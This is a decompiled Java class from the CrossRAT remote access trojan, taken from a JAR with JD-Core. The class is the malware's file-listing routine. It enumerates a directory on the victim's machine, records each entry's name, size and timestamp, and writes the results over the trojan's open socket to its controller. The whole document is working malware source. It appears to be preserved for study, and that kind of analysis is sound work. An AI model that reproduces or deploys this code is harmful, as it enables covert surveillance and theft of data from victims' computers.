package crossrat;

import java.io.BufferedInputStream;
import java.io.ByteArrayInputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;

final class c
  extends Thread
{
  private String a;
  
  public c(String paramString)
  {
    this.a = paramString;
  }
  
  public final void run()
  {
    new e();
    Object localObject1 = this.a;
    localObject1 = (localObject1 = new File((String)localObject1)).listFiles();
    Object localObject2 = "";
    if (localObject1 != null)
    {
      Object localObject3;
      int j = (localObject3 = localObject1).length;
      for (int i = 0; i < j; i++) {
        if ((localObject1 = localObject3[i]).isDirectory()) {
          localObject2 = localObject2 + 'D' + k.d + ((File)localObject1).getName() + k.d + k.e;
        } else {
          localObject2 = localObject2 + 'F' + k.d + ((File)localObject1).getName() + k.d + ((File)localObject1).length() + k.d + ((File)localObject1).lastModified() + k.d + k.e;
        }
      }
      try
      {
        (localObject1 = new DataOutputStream(k.l.getOutputStream())).writeBytes(k.g + k.d + k.B + k.d + "&&&");
        try
        {
          Thread.sleep(1000L);
        }
        catch (InterruptedException localInterruptedException)
        {
          Thread.currentThread().interrupt();
        }
        ((DataOutputStream)localObject1).flush();
        localObject2 = localObject2 + k.C;
        localObject1 = new ByteArrayInputStream(((String)localObject2).getBytes());
        localObject2 = new BufferedInputStream((InputStream)localObject1);
        OutputStream localOutputStream = k.l.getOutputStream();
        localObject3 = new byte['߿'];
        while ((j = ((BufferedInputStream)localObject2).read((byte[])localObject3)) != -1)
        {
          localOutputStream.write((byte[])localObject3, 0, j);
          Thread.sleep(100L);
        }
        ((InputStream)localObject1).close();
        ((BufferedInputStream)localObject2).close();
        return;
      }
      catch (Exception localException)
      {
        (localObject1 = localException).printStackTrace();
      }
    }
  }
}


/* Location:              C:\Users\sihadan\Desktop\CrossRAT\CrossRAT\CrossRat\hmar6.jar!\crossrat\c.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       0.7.1
 */